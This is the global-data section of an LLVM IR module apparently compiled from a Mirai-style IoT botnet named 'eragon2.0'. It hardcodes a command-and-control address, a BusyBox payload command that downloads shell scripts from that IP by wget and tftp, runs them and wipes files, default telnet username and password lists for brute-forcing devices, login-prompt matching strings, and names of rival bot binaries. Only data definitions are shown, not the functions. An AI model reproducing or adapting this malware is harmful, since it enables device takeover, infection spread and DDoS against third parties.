; ModuleID = 'host/ir_bcf/eragon2.0.ll'
source_filename = "eragon2.0.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%union.anon.6 = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"SERVER\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"DEVICE\00", align 1
@.str.4 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.5 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.6 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.8 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.9 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.10 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.11 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.12 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.13 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.14 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.15 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.19 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.20 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.21 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.22 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.23 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.24 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.25 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.27 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.28 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.29 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.30 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.31 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.32 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.33 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.34 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.35 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.37 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.38 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@useragents = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.40 = private unnamed_addr constant [16 x i8] c"80.211.79.50:27\00", align 1
@ServerInfo = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i32 0, i32 0)], align 8
@.str.41 = private unnamed_addr constant [163 x i8] c"cd /tmp/; /bin/busybox wget http://80.211.79.50/bins.sh; chmod +x bins.sh; sh bins.sh;  tftp -r tftp1.sh -g 80.211.79.50; chmod +x tftp1.sh; sh tftp1.sh; rm -rf *\00", align 1
@BusyBoxPayload = global i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.41, i32 0, i32 0), align 8
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@usernames = global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0)], align 16
@.str.44 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.45 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@passwords = global [4 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.45, i32 0, i32 0)], align 16
@.str.46 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.47 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.49 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.53 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i32 0, i32 0), i8* null], align 16
@.str.56 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.58 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.59 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.59, i32 0, i32 0), i8* null], align 16
@.str.60 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.62 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.63 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* null], align 16
@.str.67 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.69 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* null], align 16
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* null], align 16
@botnetServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@KadenCommStock = global i32 0, align 4
@.str.70 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.72 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.73 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.74 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.77 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.78 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.79 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.80 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.81 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.82 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.83 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.84 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.85 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.86 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.87 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.88 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.89 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.90 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.91 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.93 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.94 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.95 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.97 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.98 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.99 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.100 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.101 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.103 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.104 = private unnamed_addr constant [18 x i8] c"armarmv5larmv6lb1\00", align 1
@.str.105 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.107 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.108 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.109 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.110 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.111 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.112 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.113 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.115 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.118 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.119 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.120 = private unnamed_addr constant [13 x i8] c"jackmyarmv5l\00", align 1
@.str.121 = private unnamed_addr constant [13 x i8] c"jackmyarmv6l\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"jackmyarv6\00", align 1
@.str.123 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.124 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.125 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.126 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.127 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"telarmv6l\00", align 1
@.str.130 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.131 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.132 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"TwoFacearmv61\00", align 1
@.str.134 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.135 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.136 = private unnamed_addr constant [12 x i8] c"TwoFacem86k\00", align 1
@.str.137 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.138 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.139 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.140 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.141 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.143 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.145 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.146 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.147 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.148 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.149 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.150 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.151 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.152 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.153 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.154 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.155 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.158 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.159 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.160 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.161 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.163 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.164 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.165 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.166 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.167 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.168 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.169 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.170 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.171 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.172 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.173 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.174 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.175 = private unnamed_addr constant [10 x i8] c"20botmips\00", align 1
@.str.176 = private unnamed_addr constant [10 x i8] c"botmipsel\00", align 1
@.str.177 = private unnamed_addr constant [7 x i8] c"botsh4\00", align 1
@.str.178 = private unnamed_addr constant [10 x i8] c"botx86_64\00", align 1
@.str.179 = private unnamed_addr constant [10 x i8] c"botarmv6l\00", align 1
@.str.180 = private unnamed_addr constant [8 x i8] c"boti686\00", align 1
@.str.181 = private unnamed_addr constant [11 x i8] c"botpowerpc\00", align 1
@.str.182 = private unnamed_addr constant [8 x i8] c"boti586\00", align 1
@.str.183 = private unnamed_addr constant [8 x i8] c"botm68k\00", align 1
@.str.184 = private unnamed_addr constant [9 x i8] c"botsparc\00", align 1
@.str.185 = private unnamed_addr constant [10 x i8] c"botarmv4l\00", align 1
@.str.186 = private unnamed_addr constant [10 x i8] c"botarmv5l\00", align 1
@.str.187 = private unnamed_addr constant [28 x i8] c"botpowerpc440fpbotmipsfinal\00", align 1
@.str.188 = private unnamed_addr constant [15 x i8] c"botmipselfinal\00", align 1
@.str.189 = private unnamed_addr constant [12 x i8] c"botsh4final\00", align 1
@.str.190 = private unnamed_addr constant [15 x i8] c"botx86_64final\00", align 1
@.str.191 = private unnamed_addr constant [15 x i8] c"botarmv6lfinal\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"boti686final\00", align 1
@.str.193 = private unnamed_addr constant [16 x i8] c"botpowerpcfinal\00", align 1
@.str.194 = private unnamed_addr constant [13 x i8] c"boti586final\00", align 1
@.str.195 = private unnamed_addr constant [13 x i8] c"botm68kfinal\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"botsparcfinal\00", align 1
@.str.197 = private unnamed_addr constant [15 x i8] c"botarmv4lfinal\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"botarmv5lfinal\00", align 1
@.str.199 = private unnamed_addr constant [21 x i8] c"botpowerpc440fpfinal\00", align 1
@.str.200 = private unnamed_addr constant [10 x i8] c"mirai.x86\00", align 1
@.str.201 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.202 = private unnamed_addr constant [11 x i8] c"mirai.mpsl\00", align 1
@.str.203 = private unnamed_addr constant [10 x i8] c"mirai.arm\00", align 1
@.str.204 = private unnamed_addr constant [12 x i8] c"mirai.arm5n\00", align 1
@.str.205 = private unnamed_addr constant [11 x i8] c"mirai.arm7\00", align 1
@.str.206 = private unnamed_addr constant [10 x i8] c"mirai.ppc\00", align 1
@.str.207 = private unnamed_addr constant [10 x i8] c"mirai.spc\00", align 1
@.str.208 = private unnamed_addr constant [11 x i8] c"mirai.m68k\00", align 1
@.str.209 = private unnamed_addr constant [10 x i8] c"mirai.sh4\00", align 1
@.str.210 = private unnamed_addr constant [12 x i8] c"miraint.x86\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"miraint.mips\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"miraint.mpsl\00", align 1
@.str.213 = private unnamed_addr constant [12 x i8] c"miraint.arm\00", align 1
@.str.214 = private unnamed_addr constant [14 x i8] c"miraint.arm5n\00", align 1
@.str.215 = private unnamed_addr constant [13 x i8] c"miraint.arm7\00", align 1
@.str.216 = private unnamed_addr constant [12 x i8] c"miraint.ppc\00", align 1
@.str.217 = private unnamed_addr constant [12 x i8] c"miraint.spc\00", align 1
@.str.218 = private unnamed_addr constant [13 x i8] c"miraint.m68k\00", align 1
@.str.219 = private unnamed_addr constant [19 x i8] c"miraint.sh4bot.x86\00", align 1
@.str.220 = private unnamed_addr constant [9 x i8] c"bot.mips\00", align 1
@.str.221 = private unnamed_addr constant [9 x i8] c"bot.mpsl\00", align 1
@.str.222 = private unnamed_addr constant [8 x i8] c"bot.arm\00", align 1
@.str.223 = private unnamed_addr constant [10 x i8] c"bot.arm5n\00", align 1
@.str.224 = private unnamed_addr constant [9 x i8] c"bot.arm7\00", align 1
@.str.225 = private unnamed_addr constant [8 x i8] c"bot.ppc\00", align 1
@.str.226 = private unnamed_addr constant [8 x i8] c"bot.spc\00", align 1
@.str.227 = private unnamed_addr constant [9 x i8] c"bot.m68k\00", align 1
